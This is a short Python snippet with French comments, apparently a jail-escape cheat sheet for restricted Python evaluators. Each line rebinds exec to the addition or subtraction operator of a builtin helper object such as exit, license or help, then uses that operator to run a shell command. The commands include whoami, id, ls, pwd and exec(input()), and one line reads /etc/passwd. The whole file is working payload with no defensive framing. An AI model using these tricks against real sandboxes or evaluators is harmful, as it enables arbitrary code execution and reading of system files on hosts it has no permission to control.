```py -cwn
# exit - fonctionne car c'est une instance de Quitter
exit.__class__.__add__ = exec; exit + "import os; os.system('whoami')"
quit.__class__.__add__ = exec; quit + "__import__('os').system('whoami')"

# license - instance de _Printer  
license.__class__.__add__ = exec; license + "print(open('/etc/passwd').read())"
credits.__class__.__add__ = exec; credits + "__import__('os').system('pwd')"
copyright.__class__.__add__ = exec; copyright + "exec(input())"

# help - instance de _Helper
help.__class__.__sub__ = exec; help - "__import__('os').system('ls')"

class X: pass
x = X()
x.__class__.__add__ = exec; x + "__import__('os').system('id')"
```